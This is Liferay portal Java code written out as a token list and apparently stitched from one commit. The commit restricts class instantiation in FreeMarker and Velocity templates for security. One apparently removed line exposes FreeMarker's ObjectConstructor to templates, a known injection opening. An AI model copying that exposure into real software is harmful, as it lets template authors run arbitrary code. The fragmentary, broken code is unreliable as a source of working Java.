";", "import", "freemarker", ".", "template", ".", "TemplateException", ";", "import", "freemarker", ".", "template", ".", "utility", ".", "ObjectConstructor", ";", "/", "**", "*", "@", "author", "Raymond", "Aug", "\u00e9", "*", "/", "public", "class", "LiferayTemplateClassResolver", "implements", "TemplateClassResolver", "{", "public", "Class", "<", "?>", "resolve", "(", "String", "className", ",", "Environment", "environment", ",", "Template", "template", ")", "throws", "TemplateException", "{", "if", "(", "className", ".", "equals", "(", "ObjectConstructor", ".", "class", ".", "getName", "(", "))", ")", "{", "throw", "new", "TemplateException", "(", "\"", "Instantiating", "\"", "+", "className", "+", "\"", "is", "not", "allowed", "in", "the", "\"", "\"", "template", "for", "security", "reasons", "\"", ",", "environment", ")", ";", "}", "for", "(", "String", "restrictedClassName", ":", "PropsValues", ".", "FREEMARKER_ENGINE_RESTRICTED_CLASSES", ")", "{", "if", "(", "className", ".", "equals", "(", "restrictedClassName", ")", ")", "{", "throw", "new", "TemplateException", "(", "\"", "Instantiating", "\"", "+", "className", "+", "\"", "is", "not", "allowed", "in", "the", "\"", "\"", "template", "for", "security", "reasons", "\"", ",", "environment", ")", ";", "}", "}", "for", "(", "String", "restrictedPackageName", ":", "PropsValues", ".", "FREEMARKER_ENGINE_RESTRICTED_PACKAGES", ")", "{", "if", "(", "className", ".", "startsWith", "(", "restrictedPackageName", ")", ")", "{", "throw", "new", "TemplateException", "(", "\"", "Instantiating", "\"", "+", "className", "+", "\"", "is", "not", "allowed", "in", "the", "\"", "\"", "template", "for", "security", "reasons", "\"", ",", "environment", ")", ";", "}", "}", "try", "{", "return", "Class", ".", "forName", "(", "className", ",", "true", ",", "PACLClassLoaderUtil", ".", "getContextClassLoader", "(", "))", ";", "}", "catch", "(", "Exception", "e", ")", "{", "throw", "new", "TemplateException", "(", "e", ",", "environment", ")", ";", "}", "}", "}", "/", "**", "*", "Copyright", "(", "c", ")", "2000", "-", "2012", "Liferay", ",", "Inc", ".", "All", "rights", "reserved", ".", "*", "*", "This", "library", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "it", "under", "*", "the", "terms", "of", "the", "GNU", "Lesser", "General", "Public", "License", "as", "published", "by", "the", "Free", "*", "Software", "Foundation", ";", "either", "version", "2", ".", "1", "of", "the", "License", ",", "or", "(", "at", "your", "option", ")", "*", "any", "later", "version", ".", "*", "*", "This", "library", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "but", "WITHOUT", "*", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "MERCHANTABILITY", "or", "FITNESS", "*", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "GNU", "Lesser", "General", "Public", "License", "for", "more", "*", "details", ".", "*", "/", "package", "com", ".", "liferay", ".", "portal", ".", "freemarker", ";", "import", "com", ".", "liferay", ".", "portal", ".", "kernel", ".", "template", ".", "TemplateException", ";", "import", "com", ".", "liferay", ".", "portal", ".", "security", ".", "lang", ".", "PortalSecurityManagerThreadLocal", ";", "import", "com", ".", "liferay", ".", "portal", ".", "security", ".", "pacl", ".", "PACLPolicy", ";", "import", "com", ".", "liferay", ".", "portal", ".", "template", ".", "TemplateContextHelper", ";", "import", "freemarker", ".", "template", ".", "Configuration", ";", "import", "java", ".", "io", ".", "Writer", ";", "import", "java", ".", "util", ".", "Map", ";", "/", "**", "*", "@", "author", "Raymond", "Aug", "\u00e9", "*", "/", "public", "class", "PACLFreeMarkerTemplate", "extends", "FreeMarkerTemplate", "{", "public", "PACLFreeMarkerTemplate", "(", "String", "templateId", ",", "String", "templateContent", ",", "String", "errorTemplateId", ",", "String", "errorTemplateContent", ",", "Map", "<", "String", ",", "Object", ">", "context", ",", "Configuration", "configuration", ",", "TemplateContextHelper", "templateContextHelper", ",", "StringTemplateLoader", "stringTemplateLoader", ",", "PACLPolicy", "paclPolicy", ")", "{", "super", "(", "templateId", ",", "templateContent", ",", "errorTemplateId", ",", "errorTemplateContent", ",", "context", ",", "configuration", ",", "templateContextHelper", ",", "stringTemplateLoader", ")", ";", "_paclPolicy", "=", "paclPolicy", ";", "}", "@", "Override", "public", "boolean", "processTemplate", "(", "Writer", "writer", ")", "throws", "TemplateException", "{", "PACLPolicy", "initialPolicy", "=", "PortalSecurityManagerThreadLocal", ".", "getPACLPolicy", "(", ");", "try", "{", "PortalSecurityManagerThreadLocal", ".", "setPACLPolicy", "(", "_paclPolicy", ")", ";", "return", "super", ".", "processTemplate", "(", "writer", ")", ";", "}", "finally", "{", "PortalSecurityManagerThreadLocal", ".", "setPACLPolicy", "(", "initialPolicy", ")", ";", "}", "}", "private", "PACLPolicy", "_paclPolicy", ";", "}", "import", "com", ".", "liferay", ".", "portal", ".", "kernel", ".", "log", ".", "Log", ";", "import", "com", ".", "liferay", ".", "portal", ".", "kernel", ".", "log", ".", "LogFactoryUtil", ";", "try", "{", "variables", ".", "put", "(", "\"", "auditMessageFactoryUtil", "\"", ",", "AuditMessageFactoryUtil", ".", "getAuditMessageFactory", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "auditRouterUtil", "\"", ",", "AuditRouterUtil", ".", "getAuditRouter", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "browserSniffer", "\"", ",", "BrowserSnifferUtil", ".", "getBrowserSniffer", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "dateFormatFactory", "\"", ",", "FastDateFormatFactoryUtil", ".", "getFastDateFormatFactory", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "ServiceLocator", "serviceLocator", "=", "ServiceLocator", ".", "getInstance", "(", ");", "/", "/", "Service", "locator", "variables", ".", "put", "(", "\"", "serviceLocator", "\"", ",", "serviceLocator", ")", ";", "try", "{", "variables", ".", "put", "(", "\"", "expandoColumnLocalService", "\"", ",", "serviceLocator", ".", "findService", "(", "ExpandoColumnLocalService", ".", "class", ".", "getName", "(", "))", ");", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "/", "/", "Expando", "row", "service", "try", "{", "variables", ".", "put", "(", "\"", "expandoRowLocalService", "\"", ",", "serviceLocator", ".", "findService", "(", "ExpandoRowLocalService", ".", "class", ".", "getName", "(", "))", ");", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "/", "/", "Expando", "table", "service", "try", "{", "variables", ".", "put", "(", "\"", "expandoTableLocalService", "\"", ",", "serviceLocator", ".", "findService", "(", "ExpandoTableLocalService", ".", "class", ".", "getName", "(", "))", ");", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "/", "/", "Expando", "value", "service", "try", "{", "variables", ".", "put", "(", "\"", "expandoValueLocalService", "\"", ",", "serviceLocator", ".", "findService", "(", "ExpandoValueLocalService", ".", "class", ".", "getName", "(", "))", ");", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "htmlUtil", "\"", ",", "HtmlUtil", ".", "getHtml", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "httpUtil", "\"", ",", "HttpUtil", ".", "getHttp", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "journalContentUtil", "\"", ",", "JournalContentUtil", ".", "getJournalContent", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "jsonFactoryUtil", "\"", ",", "JSONFactoryUtil", ".", "getJSONFactory", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "languageUtil", "\"", ",", "LanguageUtil", ".", "getLanguage", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "unicodeLanguageUtil", "\"", ",", "UnicodeLanguageUtil", ".", "getUnicodeLanguage", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "localeUtil", "\"", ",", "LocaleUtil", ".", "getInstance", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "portalUtil", "\"", ",", "PortalUtil", ".", "getPortal", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "portal", "\"", ",", "PortalUtil", ".", "getPortal", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "prefsPropsUtil", "\"", ",", "PrefsPropsUtil", ".", "getPrefsProps", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "propsUtil", "\"", ",", "PropsUtil", ".", "getProps", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "portletURLFactory", "\"", ",", "PortletURLFactoryUtil", ".", "getPortletURLFactory", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "randomizer", "\"", ",", "Randomizer_IW", ".", "getInstance", "(", ").", "getWrappedInstance", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "UtilLocator", "utilLocator", "=", "UtilLocator", ".", "getInstance", "(", ");", "/", "/", "Util", "locator", "variables", ".", "put", "(", "\"", "utilLocator", "\"", ",", "utilLocator", ")", ";", "/", "/", "SAX", "reader", "util", "try", "{", "variables", ".", "put", "(", "\"", "saxReaderUtil", "\"", ",", "utilLocator", ".", "findUtil", "(", "SAXReader", ".", "class", ".", "getName", "(", "))", ");", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "webServerToken", "\"", ",", "WebServerServletTokenUtil", ".", "getWebServerServletToken", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "accountPermission", "\"", ",", "AccountPermissionUtil", ".", "getAccountPermission", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "commonPermission", "\"", ",", "CommonPermissionUtil", ".", "getCommonPermission", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "groupPermission", "\"", ",", "GroupPermissionUtil", ".", "getGroupPermission", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "layoutPermission", "\"", ",", "LayoutPermissionUtil", ".", "getLayoutPermission", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "organizationPermission", "\"", ",", "OrganizationPermissionUtil", ".", "getOrganizationPermission", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "passwordPolicyPermission", "\"", ",", "PasswordPolicyPermissionUtil", ".", "getPasswordPolicyPermission", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "portalPermission", "\"", ",", "PortalPermissionUtil", ".", "getPortalPermission", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "portletPermission", "\"", ",", "PortletPermissionUtil", ".", "getPortletPermission", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "rolePermission", "\"", ",", "RolePermissionUtil", ".", "getRolePermission", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "userGroupPermission", "\"", ",", "UserGroupPermissionUtil", ".", "getUserGroupPermission", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "userPermission", "\"", ",", "UserPermissionUtil", ".", "getUserPermission", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "dateFormats", "\"", ",", "FastDateFormatFactoryUtil", ".", "getFastDateFormatFactory", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "imageToken", "\"", ",", "WebServerServletTokenUtil", ".", "getWebServerServletToken", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "try", "{", "variables", ".", "put", "(", "\"", "locationPermission", "\"", ",", "OrganizationPermissionUtil", ".", "getOrganizationPermission", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "private", "static", "Log", "_log", "=", "LogFactoryUtil", ".", "getLog", "(", "TemplateContextHelper", ".", "class", ")", ";", "public", "static", "final", "String", "[", "]", "FREEMARKER_ENGINE_RESTRICTED_CLASSES", "=", "PropsUtil", ".", "getArray", "(", "PropsKeys", ".", "FREEMARKER_ENGINE_RESTRICTED_CLASSES", ")", ";", "public", "static", "final", "String", "[", "]", "FREEMARKER_ENGINE_RESTRICTED_PACKAGES", "=", "PropsUtil", ".", "getArray", "(", "PropsKeys", ".", "FREEMARKER_ENGINE_RESTRICTED_PACKAGES", ")", ";", "public", "static", "final", "String", "[", "]", "VELOCITY_ENGINE_RESTRICTED_CLASSES", "=", "PropsUtil", ".", "getArray", "(", "PropsKeys", ".", "VELOCITY_ENGINE_RESTRICTED_CLASSES", ")", ";", "public", "static", "final", "String", "[", "]", "VELOCITY_ENGINE_RESTRICTED_PACKAGES", "=", "PropsUtil", ".", "getArray", "(", "PropsKeys", ".", "VELOCITY_ENGINE_RESTRICTED_PACKAGES", ")", ";", "/", "**", "*", "Copyright", "(", "c", ")", "2000", "-", "2012", "Liferay", ",", "Inc", ".", "All", "rights", "reserved", ".", "*", "*", "This", "library", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "it", "under", "*", "the", "terms", "of", "the", "GNU", "Lesser", "General", "Public", "License", "as", "published", "by", "the", "Free", "*", "Software", "Foundation", ";", "either", "version", "2", ".", "1", "of", "the", "License", ",", "or", "(", "at", "your", "option", ")", "*", "any", "later", "version", ".", "*", "*", "This", "library", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "but", "WITHOUT", "*", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "MERCHANTABILITY", "or", "FITNESS", "*", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "GNU", "Lesser", "General", "Public", "License", "for", "more", "*", "details", ".", "*", "/", "package", "com", ".", "liferay", ".", "portal", ".", "velocity", ";", "import", "com", ".", "liferay", ".", "portal", ".", "kernel", ".", "log", ".", "Log", ";", "import", "com", ".", "liferay", ".", "portal", ".", "kernel", ".", "log", ".", "LogFactoryUtil", ";", "import", "org", ".", "apache", ".", "velocity", ".", "app", ".", "event", ".", "MethodExceptionEventHandler", ";", "/", "**", "*", "@", "author", "Raymond", "Aug", "\u00e9", "*", "/", "public", "class", "LiferayMethodExceptionEventHandler", "implements", "MethodExceptionEventHandler", "{", "public", "Object", "methodException", "(", "@", "SuppressWarnings", "(", "\"", "rawtypes", "\"", ")", "Class", "clazz", ",", "String", "method", ",", "Exception", "e", ")", "throws", "Exception", "{", "_log", ".", "error", "(", "e", ",", "e", ")", ";", "return", "null", ";", "}", "private", "static", "Log", "_log", "=", "LogFactoryUtil", ".", "getLog", "(", "LiferayMethodExceptionEventHandler", ".", "class", ")", ";", "}", "/", "**", "*", "Copyright", "(", "c", ")", "2000", "-", "2012", "Liferay", ",", "Inc", ".", "All", "rights", "reserved", ".", "*", "*", "This", "library", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "it", "under", "*", "the", "terms", "of", "the", "GNU", "Lesser", "General", "Public", "License", "as", "published", "by", "the", "Free", "*", "Software", "Foundation", ";", "either", "version", "2", ".", "1", "of", "the", "License", ",", "or", "(", "at", "your", "option", ")", "*", "any", "later", "version", ".", "*", "*", "This", "library", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "but", "WITHOUT", "*", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "MERCHANTABILITY", "or", "FITNESS", "*", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "GNU", "Lesser", "General", "Public", "License", "for", "more", "*", "details", ".", "*", "/", "package", "com", ".", "liferay", ".", "portal", ".", "velocity", ";", "import", "com", ".", "liferay", ".", "portal", ".", "kernel", ".", "template", ".", "TemplateException", ";", "import", "com", ".", "liferay", ".", "portal", ".", "security", ".", "lang", ".", "PortalSecurityManagerThreadLocal", ";", "import", "com", ".", "liferay", ".", "portal", ".", "security", ".", "pacl", ".", "PACLPolicy", ";", "import", "com", ".", "liferay", ".", "portal", ".", "template", ".", "TemplateContextHelper", ";", "import", "java", ".", "io", ".", "Writer", ";", "import", "org", ".", "apache", ".", "velocity", ".", "VelocityContext", ";", "import", "org", ".", "apache", ".", "velocity", ".", "app", ".", "VelocityEngine", ";", "/", "**", "*", "@", "author", "Raymond", "Aug", "\u00e9", "*", "/", "public", "class", "PACLVelocityTemplate", "extends", "VelocityTemplate", "{", "public", "PACLVelocityTemplate", "(", "String", "templateId", ",", "String", "templateContent", ",", "String", "errorTemplateId", ",", "String", "errorTemplateContent", ",", "VelocityContext", "velocityContext", ",", "VelocityEngine", "velocityEngine", ",", "TemplateContextHelper", "templateContextHelper", ",", "PACLPolicy", "paclPolicy", ")", "{", "super", "(", "templateId", ",", "templateContent", ",", "errorTemplateId", ",", "errorTemplateContent", ",", "velocityContext", ",", "velocityEngine", ",", "templateContextHelper", ")", ";", "_paclPolicy", "=", "paclPolicy", ";", "}", "@", "Override", "public", "boolean", "processTemplate", "(", "Writer", "writer", ")", "throws", "TemplateException", "{", "PACLPolicy", "initialPolicy", "=", "PortalSecurityManagerThreadLocal", ".", "getPACLPolicy", "(", ");", "try", "{", "PortalSecurityManagerThreadLocal", ".", "setPACLPolicy", "(", "_paclPolicy", ")", ";", "return", "super", ".", "processTemplate", "(", "writer", ")", ";", "}", "finally", "{", "PortalSecurityManagerThreadLocal", ".", "setPACLPolicy", "(", "initialPolicy", ")", ";", "}", "}", "private", "PACLPolicy", "_paclPolicy", ";", "}", "import", "com", ".", "liferay", ".", "portal", ".", "kernel", ".", "util", ".", "StringUtil", ";", "import", "com", ".", "liferay", ".", "portal", ".", "security", ".", "lang", ".", "PortalSecurityManagerThreadLocal", ";", "import", "com", ".", "liferay", ".", "portal", ".", "security", ".", "pacl", ".", "PACLClassLoaderUtil", ";", "import", "com", ".", "liferay", ".", "portal", ".", "security", ".", "pacl", ".", "PACLPolicy", ";", "import", "com", ".", "liferay", ".", "portal", ".", "security", ".", "pacl", ".", "PACLPolicyManager", ";", "import", "java", ".", "util", ".", "concurrent", ".", "ConcurrentHashMap", ";", "import", "org", ".", "apache", ".", "velocity", ".", "runtime", ".", "RuntimeConstants", ";", "import", "org", ".", "apache", ".", "velocity", ".", "util", ".", "introspection", ".", "SecureUberspector", ";", "_classLoaderVelocityContexts", ".", "clear", "(", ");", "_classLoaderVelocityContexts", "=", "null", ";", "public", "void", "destroy", "(", "ClassLoader", "classLoader", ")", "{", "_classLoaderVelocityContexts", ".", "remove", "(", "classLoader", ")", ";", "}", "if", "(", "templateContextType", ".", "equals", "(", "TemplateContextType", ".", "CLASS_LOADER", ")", ")", "{", "/", "/", "This", "template", "will", "have", "all", "of", "its", "utilities", "initialized", "within", "/", "/", "the", "class", "loader", "of", "the", "current", "thread", "ClassLoader", "contextClassLoader", "=", "PACLClassLoaderUtil", ".", "getContextClassLoader", "(", ");", "PACLPolicy", "threadLocalPACLPolicy", "=", "PortalSecurityManagerThreadLocal", ".", "getPACLPolicy", "(", ");", "PACLPolicy", "contextClassLoaderPACLPolicy", "=", "PACLPolicyManager", ".", "getPACLPolicy", "(", "contextClassLoader", ")", ";", "try", "{", "PortalSecurityManagerThreadLocal", ".", "setPACLPolicy", "(", "contextClassLoaderPACLPolicy", ")", ";", "VelocityContext", "velocityContext", "=", "_classLoaderVelocityContexts", ".", "get", "(", "contextClassLoader", ")", ";", "if", "(", "velocityContext", "=", "=", "null", ")", "{", "velocityContext", "=", "new", "VelocityContext", "(", ");", "Map", "<", "String", ",", "Object", ">", "helperUtilities", "=", "_templateContextHelper", ".", "getHelperUtilities", "(", ");", "for", "(", "Map", ".", "Entry", "<", "String", ",", "Object", ">", "entry", ":", "helperUtilities", ".", "entrySet", "(", "))", "{", "velocityContext", ".", "put", "(", "entry", ".", "getKey", "(", "),", "entry", ".", "getValue", "(", "))", ";", "}", "_classLoaderVelocityContexts", ".", "put", "(", "contextClassLoader", ",", "velocityContext", ")", ";", "}", "return", "new", "PACLVelocityTemplate", "(", "templateId", ",", "templateContent", ",", "errorTemplateId", ",", "errorTemplateContent", ",", "velocityContext", ",", "_velocityEngine", ",", "_templateContextHelper", ",", "contextClassLoaderPACLPolicy", ")", ";", "}", "finally", "{", "PortalSecurityManagerThreadLocal", ".", "setPACLPolicy", "(", "threadLocalPACLPolicy", ")", ";", "}", "}", "else", "if", "(", "templateContextType", ".", "equals", "(", "TemplateContextType", ".", "EMPTY", ")", ")", "{", "extendedProperties", ".", "setProperty", "(", "VelocityEngine", ".", "EVENTHANDLER_METHODEXCEPTION", ",", "LiferayMethodExceptionEventHandler", ".", "class", ".", "getName", "(", "))", ";", "RuntimeConstants", ".", "INTROSPECTOR_RESTRICT_CLASSES", ",", "StringUtil", ".", "merge", "(", "PropsValues", ".", "VELOCITY_ENGINE_RESTRICTED_CLASSES", ")", ");", "RuntimeConstants", ".", "INTROSPECTOR_RESTRICT_PACKAGES", ",", "StringUtil", ".", "merge", "(", "PropsValues", ".", "VELOCITY_ENGINE_RESTRICTED_PACKAGES", ")", ");", "VelocityEngine", ".", "RESOURCE_LOADER", ",", "\"", "string", ",", "servlet", "\"", ");", "\"", "servlet", ".", "\"", "+", "VelocityEngine", ".", "RESOURCE_LOADER", "+", "\"", ".", "cache", "\"", ",", "\"", "servlet", ".", "\"", "+", "VelocityEngine", ".", "RESOURCE_LOADER", "+", "\"", ".", "class", "\"", ",", "extendedProperties", ".", "setProperty", "(", "\"", "string", ".", "\"", "+", "VelocityEngine", ".", "RESOURCE_LOADER", "+", "\"", ".", "cache", "\"", ",", "String", ".", "valueOf", "(", "PropsValues", ".", "VELOCITY_ENGINE_RESOURCE_MANAGER_CACHE_ENABLED", ")", ");", "extendedProperties", ".", "setProperty", "(", "\"", "string", ".", "\"", "+", "VelocityEngine", ".", "RESOURCE_LOADER", "+", "\"", ".", "class", "\"", ",", "StringResourceLoader", ".", "class", ".", "getName", "(", "))", ";", "extendedProperties", ".", "setProperty", "(", "\"", "string", ".", "\"", "+", "VelocityEngine", ".", "RESOURCE_LOADER", "+", "\"", ".", "repository", ".", "class", "\"", ",", "StringResourceRepositoryImpl", ".", "class", ".", "getName", "(", "))", ";", "extendedProperties", ".", "setProperty", "(", "VelocityEngine", ".", "RUNTIME_LOG_LOGSYSTEM_CLASS", ",", "PropsUtil", ".", "get", "(", "PropsKeys", ".", "VELOCITY_ENGINE_LOGGER", ")", ");", "extendedProperties", ".", "setProperty", "(", "VelocityEngine", ".", "RUNTIME_LOG_LOGSYSTEM", "+", "\"", ".", "log4j", ".", "category", "\"", ",", "PropsUtil", ".", "get", "(", "PropsKeys", ".", "VELOCITY_ENGINE_LOGGER_CATEGORY", ")", ");", "extendedProperties", ".", "setProperty", "(", "RuntimeConstants", ".", "UBERSPECT_CLASSNAME", ",", "SecureUberspector", ".", "class", ".", "getName", "(", "))", ";", "private", "Map", "<", "ClassLoader", ",", "VelocityContext", ">", "_classLoaderVelocityContexts", "=", "new", "ConcurrentHashMap", "<", "ClassLoader", ",", "VelocityContext", ">", "()", ";", "import", "com", ".", "liferay", ".", "portal", ".", "kernel", ".", "log", ".", "Log", ";", "import", "com", ".", "liferay", ".", "portal", ".", "kernel", ".", "log", ".", "LogFactoryUtil", ";", "try", "{", "velocityContext", ".", "put", "(", "\"", "rolePermission", "\"", ",", "RolePermissionUtil", ".", "getRolePermission", "(", "))", ";", "}", "catch", "(", "SecurityException", "se", ")", "{", "_log", ".", "error", "(", "se", ",", "se", ")", ";", "}", "private", "static", "Log", "_log", "=", "LogFactoryUtil", ".", "getLog", "(", "VelocityTemplateContextHelper", ".", "class", ")", ";", "public", "void", "destroy", "(", "ClassLoader", "classLoader", ")", ";", "public", "static", "void", "destroy", "(", "ClassLoader", "classLoader", ")", "{", "Map", "<", "String", ",", "TemplateManager", ">", "templateManagers", "=", "_getTemplateManagers", "(", ");", "for", "(", "TemplateManager", "templateManager", ":", "templateManagers", ".", "values", "(", "))", "{", "templateManager", ".", "destroy", "(", "classLoader", ")", ";", "}", "}", "public", "static", "final", "String", "FREEMARKER_ENGINE_RESTRICTED_CLASSES", "=", "\"", "freemarker", ".", "engine", ".", "restricted", ".", "classes", "\"", ";", "public", "static", "final", "String", "FREEMARKER_ENGINE_RESTRICTED_PACKAGES", "=", "\"", "freemarker", ".", "engine", ".", "restricted", ".", "packages", "\"", ";", "public", "static", "final", "String", "VELOCITY_ENGINE_RESTRICTED_CLASSES", "=", "\"", "velocity", ".", "engine", ".", "restricted", ".", "classes", "\"", ";", "public", "static", "final", "String", "VELOCITY_ENGINE_RESTRICTED_PACKAGES", "=", "\"", "velocity", ".", "engine", ".", "restricted", ".", "packages", "\"", ";</s>PACLPolicyManager", ".", "unregister", "(", "hotDeployEvent", ".", "getContextClassLoader", "(", "))", ";", "if", "(", "templateContextType", ".", "equals", "(", "TemplateContextType", ".", "EMPTY", ")", ")", "{", "import", "freemarker", ".", "template", ".", "utility", ".", "ObjectConstructor", ";", "helperUtilities", ".", "put", "(", "\"", "objectUtil", "\"", ",", "new", "ObjectConstructor", "(", "))", ";", "variables", ".", "put", "(", "\"", "auditMessageFactoryUtil", "\"", ",", "AuditMessageFactoryUtil", ".", "getAuditMessageFactory", "(", "))", ";", "variables", ".", "put", "(", "\"", "auditRouterUtil", "\"", ",", "AuditRouterUtil", ".", "getAuditRouter", "(", "))", ";", "variables", ".", "put", "(", "\"", "browserSniffer", "\"", ",", "BrowserSnifferUtil", ".", "getBrowserSniffer", "(", "))", ";", "variables", ".", "put", "(", "\"", "dateFormatFactory", "\"", ",", "FastDateFormatFactoryUtil", ".", "getFastDateFormatFactory", "(", "))", ";", "ServiceLocator", "serviceLocator", "=", "ServiceLocator", ".", "getInstance", "(", ");", "variables", ".", "put", "(", "\"", "expandoColumnLocalService", "\"", ",", "serviceLocator", ".", "findService", "(", "ExpandoColumnLocalService", ".", "class", ".", "getName", "(", "))", ");", "/", "/", "Expando", "row", "service", "variables", ".", "put", "(", "\"", "expandoRowLocalService", "\"", ",", "serviceLocator", ".", "findService", "(", "ExpandoRowLocalService", ".", "class", ".", "getName", "(", "))", ");", "/", "/", "Expando", "table", "service", "variables", ".", "put", "(", "\"", "expandoTableLocalService", "\"", ",", 